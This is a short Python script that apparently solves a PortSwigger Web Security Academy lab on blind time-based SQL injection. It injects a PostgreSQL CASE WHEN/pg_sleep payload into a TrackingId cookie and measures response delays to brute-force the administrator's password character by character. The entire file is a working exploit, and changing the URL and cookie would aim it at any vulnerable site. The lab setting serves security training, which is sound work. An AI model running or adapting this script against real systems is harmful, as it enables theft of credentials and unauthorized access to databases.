#Blind SQL injection with time delays and information retrieval
import requests
characters= list('abcdefghijklmnopqrstuvwxyz'+'0123456789'+r'!@#$%^&{}><:"{}[]')

burp0_url = "https://0a89000504e58a0181471bf0006800a6.web-security-academy.net:443/filter?category=Gifts"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
                  "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                  "Referer": "https://0a89000504e58a0181471bf0006800a6.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
admin_password= []

for number in range(1,21):
    for character in characters:
        burp0_cookies = {"TrackingId": "dJScFCL8MZDqFTjU'+||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{},1)='{}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users)--".format(number,character), 
                         "session": "t0yLJkxlOtIr6OBuUHWLFp04LnDpy0ge"}
         
        responce=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
       
        if (responce.elapsed.total_seconds()>=10):
            print(burp0_cookies)
            print(character)
            admin_password.append(character)
            break
        
admin_password = ''.join(admin_password)
print(admin_password)